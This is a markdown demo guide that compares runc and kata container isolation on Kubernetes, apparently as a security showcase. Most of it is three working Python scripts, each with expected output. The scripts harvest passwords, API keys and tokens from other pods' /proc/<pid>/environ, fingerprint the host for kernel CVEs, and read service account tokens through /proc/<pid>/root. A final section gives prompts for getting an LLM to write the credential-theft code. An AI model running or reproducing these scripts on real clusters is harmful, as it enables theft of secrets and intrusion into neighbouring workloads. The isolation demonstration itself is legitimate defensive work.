# Attack Payloads: Host PID Namespace Exploitation

These attacks exploit `hostPID: true` + `privileged: true` to read data from other pods via the shared `/proc` filesystem. They use **only the Python standard library** (no pip install needed).

## Why this works in runc but not in kata

| | runc | kata |
|---|---|---|
| **Kernel** | Shares the node's kernel | Own guest kernel inside a VM |
| **`/proc`** | Shows all node processes (with hostPID) | Shows only VM-internal processes |
| **`/proc/<pid>/environ`** | Readable (privileged bypasses SELinux) | No other-pod processes exist |
| **Host info** | Real node kernel, CPU, memory | VM kernel, vCPU, allocated memory |

The pod spec is **identical** — same `hostPID`, same `privileged`, same service account. The only difference is `runtimeClassName: kata-remote`.

---

## Attack 1: Credential Theft via /proc (MAIN DEMO)

Paste this into the Chat UI and click Run.

```python
import os

print("=" * 60)
print("SCANNING HOST FOR OTHER PODS' CREDENTIALS")
print("=" * 60)

my_pid = os.getpid()
my_pids = {str(my_pid), '1', '2'}
stolen = []

for entry in sorted(os.listdir('/proc'), key=lambda x: int(x) if x.isdigit() else 0):
    if not entry.isdigit() or entry in my_pids:
        continue
    pid = entry
    try:
        with open(f'/proc/{pid}/cmdline', 'rb') as f:
            cmdline = f.read().replace(b'\x00', b' ').decode('utf-8', errors='replace').strip()
        if not cmdline:
            continue

        with open(f'/proc/{pid}/environ', 'rb') as f:
            raw = f.read().decode('utf-8', errors='replace')

        env_vars = [v for v in raw.split('\x00') if v]
        secrets = [v for v in env_vars if any(
            k in v.upper() for k in ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'CREDENTIAL']
        ) and '=' in v]

        if secrets:
            print(f"\nPID {pid}: {cmdline[:100]}")
            for s in secrets:
                name, _, value = s.partition('=')
                print(f"  STOLEN  {name} = {value}")
                stolen.append(s)
    except (PermissionError, FileNotFoundError, ProcessLookupError):
        continue

print("\n" + "=" * 60)
if stolen:
    print(f"RESULT: Stole {len(stolen)} credentials from other pods!")
    print("An attacker now has database passwords, API keys, etc.")
else:
    print("RESULT: No other pods' processes visible.")
    print("VM isolation is working - /proc only shows this VM's processes.")
print("=" * 60)
```

### Expected output — runc (VULNERABLE)

```
============================================================
SCANNING HOST FOR OTHER PODS' CREDENTIALS
============================================================

PID 4521: python3 -c import time; print('Payment service running...')
  STOLEN  DB_PASSWORD = xK9#mP2$vL5nQ8wR!jF3
  STOLEN  STRIPE_SECRET_KEY = sk_live_51Hb3gK2eZvKYlo2C0EXAMPLE
  STOLEN  STRIPE_WEBHOOK_SECRET = whsec_5GaP9kR2mN7xJ1vQ4bEXAMPLE
  STOLEN  AWS_ACCESS_KEY_ID = AKIAIOSFODNN7EXAMPLE
  STOLEN  AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  STOLEN  ENCRYPTION_MASTER_KEY = aes-256-gcm:dGhpcyBpcyBhIGRlbW8ga2V5

============================================================
RESULT: Stole 6 credentials from other pods!
An attacker now has database passwords, API keys, etc.
============================================================
```

### Expected output — kata (PROTECTED)

```
============================================================
SCANNING HOST FOR OTHER PODS' CREDENTIALS
============================================================

============================================================
RESULT: No other pods' processes visible.
VM isolation is working - /proc only shows this VM's processes.
============================================================
```

---

## Attack 2: Host Reconnaissance

Shows what an attacker can learn about the infrastructure. In runc, this reveals real node hardware and kernel (useful for finding CVEs). In kata, it shows only the lightweight VM.

```python
import os

print("=" * 60)
print("HOST INFRASTRUCTURE RECONNAISSANCE")
print("=" * 60)

# Kernel version
try:
    with open('/proc/version') as f:
        print(f"\nKernel:  {f.read().strip()}")
except Exception as e:
    print(f"\nKernel:  blocked ({e})")

# Total visible processes
pids = [d for d in os.listdir('/proc') if d.isdigit()]
print(f"Visible processes: {len(pids)}")

# Memory
try:
    with open('/proc/meminfo') as f:
        for line in f:
            if 'MemTotal' in line:
                kb = int(line.split()[1])
                print(f"Total memory: {kb // 1024} MB ({kb // 1048576} GB)")
                break
except Exception as e:
    print(f"Memory: blocked ({e})")

# CPUs
try:
    cpus = sum(1 for line in open('/proc/cpuinfo') if line.startswith('processor'))
    print(f"CPU cores: {cpus}")
except Exception as e:
    print(f"CPUs: blocked ({e})")

# Boot command line
try:
    with open('/proc/cmdline') as f:
        cmdline = f.read().strip()
        print(f"Boot cmdline: {cmdline[:200]}")
except Exception as e:
    print(f"Boot cmdline: blocked ({e})")

# Cgroup of PID 1
try:
    with open('/proc/1/cgroup') as f:
        print(f"PID 1 cgroup: {f.read().strip()[:200]}")
except Exception as e:
    print(f"PID 1 cgroup: blocked ({e})")

print("\n" + "=" * 60)
print("In runc: real host info (useful for finding kernel CVEs)")
print("In kata: VM info only (attacker learns nothing about the host)")
print("=" * 60)
```

### Expected output — runc

```
============================================================
HOST INFRASTRUCTURE RECONNAISSANCE
============================================================

Kernel:  Linux version 5.14.0-284.30.1.el9_2.x86_64 ...
Visible processes: 347
Total memory: 32012 MB (31 GB)
CPU cores: 16
Boot cmdline: BOOT_IMAGE=(hd0,gpt3)/vmlinuz-5.14.0-284...
PID 1 cgroup: 0::/../../crio-abc123def456.scope

============================================================
In runc: real host info (useful for finding kernel CVEs)
In kata: VM info only (attacker learns nothing about the host)
============================================================
```

### Expected output — kata

```
============================================================
HOST INFRASTRUCTURE RECONNAISSANCE
============================================================

Kernel:  Linux version 6.1.62 ...
Visible processes: 8
Total memory: 2048 MB (2 GB)
CPU cores: 2
Boot cmdline: (kata guest kernel boot params)
PID 1 cgroup: 0::/

============================================================
In runc: real host info (useful for finding kernel CVEs)
In kata: VM info only (attacker learns nothing about the host)
============================================================
```

---

## Attack 3: Read Other Pods' Filesystems via /proc

With hostPID and runc, you can access other processes' root filesystems through `/proc/<pid>/root`. This can expose config files, application code, mounted secrets, etc.

```python
import os

print("=" * 60)
print("ACCESSING OTHER PODS' FILESYSTEMS VIA /proc")
print("=" * 60)

my_pid = os.getpid()
accessed = []
targets = [
    'var/run/secrets/kubernetes.io/serviceaccount/token',
    'etc/passwd',
]

for entry in sorted(os.listdir('/proc'), key=lambda x: int(x) if x.isdigit() else 0):
    if not entry.isdigit() or entry in {str(my_pid), '1', '2'}:
        continue
    pid = entry
    try:
        with open(f'/proc/{pid}/cmdline', 'rb') as f:
            cmdline = f.read().replace(b'\x00', b' ').decode('utf-8', errors='replace').strip()
        if not cmdline:
            continue

        root = f'/proc/{pid}/root'
        if not os.path.isdir(root):
            continue

        for target in targets:
            path = os.path.join(root, target)
            try:
                with open(path) as f:
                    content = f.read()[:300]
                print(f"\nPID {pid} ({cmdline[:60]})")
                print(f"  File: /{target}")
                print(f"  Content: {content[:200]}")
                accessed.append(f"PID {pid}: /{target}")
            except:
                pass
    except (PermissionError, FileNotFoundError, ProcessLookupError):
        continue

print("\n" + "=" * 60)
if accessed:
    print(f"RESULT: Read {len(accessed)} files from other pods!")
else:
    print("RESULT: Cannot access other pods' filesystems.")
    print("VM isolation prevents /proc/<pid>/root traversal.")
print("=" * 60)
```

---

## Prompt Versions (for the LLM to generate the attack)

If you want the LLM to generate the code itself instead of pasting it directly, use these prompts:

### Prompt 1 (credential theft — best for demo):
```
Write Python code that scans /proc to find all running processes on this node.
For each process, read /proc/<pid>/environ and look for DB_PASSWORD, DB_HOST,
DB_USER, STRIPE_SECRET_KEY, AWS_SECRET_ACCESS_KEY. Print each variable name
and value. Use only the os module, no external packages. Do not add comments.
```

### Prompt 2 (reconnaissance):
```
Write Python code to fingerprint this host: kernel version, total memory,
CPU count, number of visible processes, and cgroup info. Read from /proc.
Use only the standard library.
```

### Prompt 3 (filesystem access):
```
Write Python code that uses /proc/<pid>/root to read files from other
processes' filesystems. Try to find service account tokens or config files.
Use only the standard library.
```
